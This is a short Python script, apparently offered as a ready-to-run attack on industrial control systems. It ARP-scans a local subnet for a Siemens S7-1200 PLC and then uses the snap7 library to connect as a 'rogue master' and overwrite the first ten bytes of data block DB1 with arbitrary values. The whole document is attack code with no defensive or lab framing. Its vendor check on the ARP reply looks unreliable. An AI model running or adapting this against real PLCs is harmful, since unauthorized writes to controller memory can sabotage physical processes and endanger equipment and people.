from scapy.all import ARP, Ether, srp
import snap7
import time

# Function to discover Siemens S7-1200 PLC on the network
def discover_plc(ip_range="192.168.1.1/24"):
    print("[+] Scanning the network for Siemens PLCs...")
    
    # Craft ARP request
    arp_request = ARP(pdst=ip_range)
    ether_frame = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether_frame / arp_request

    # Send the packet
    ans, _ = srp(packet, timeout=2, verbose=False)

    for sent, received in ans:
        if "Siemens" in received.summary():
            print(f"[+] Found Siemens PLC: {received.psrc}")
            return received.psrc

    print("[-] No Siemens PLC found.")
    return None

# Function to execute rogue commands on PLC
def rogue_master(plc_ip):
    try:
        print(f"[+] Connecting to PLC at {plc_ip} as a rogue master...")
        plc = snap7.client.Client()
        plc.connect(plc_ip, 0, 1)  # Rack 0, Slot 1 for S7-1200

        if plc.get_connected():
            print("[+] Successfully connected. Sending rogue command...")

            # Example: Modify Data Block (DB1, first 10 bytes)
            data = bytearray([0xFF] * 10)  # Filling memory with arbitrary data
            plc.db_write(db_number=1, start=0, data=data)
            print("[+] Unauthorized modification sent to PLC!")

        plc.disconnect()
        print("[+] Disconnected from PLC.")

    except Exception as e:
        print(f"[-] Error: {e}")

# Main Execution
if __name__ == "__main__":
    plc_ip = discover_plc()  # Scan the network for the PLC
    if plc_ip:
        rogue_master(plc_ip)  # Execute rogue commands